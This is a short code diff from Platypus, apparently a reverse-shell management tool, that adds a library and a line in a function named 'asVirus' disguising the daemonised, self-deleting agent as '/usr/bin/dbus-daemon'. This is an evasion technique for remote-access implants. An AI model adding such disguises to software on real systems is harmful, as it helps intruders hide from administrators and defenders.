@@ -27,6 +27,7 @@ import (
 	"github.com/WangYihang/Platypus/internal/util/update"
 	"github.com/armon/go-socks5"
 	"github.com/creack/pty"
+	"github.com/erikdubbelboer/gspt"
 	"github.com/phayes/freeport"
 	"github.com/rhysd/go-github-selfupdate/selfupdate"
 	"github.com/sevlyar/go-daemon"
@@ -782,6 +783,7 @@ func asVirus() {
 	defer cntxt.Release()
 	log.Success("daemon started")
 	removeSelfExecutable()
+	gspt.SetProcTitle("/usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only")
 }
 
 func main() {
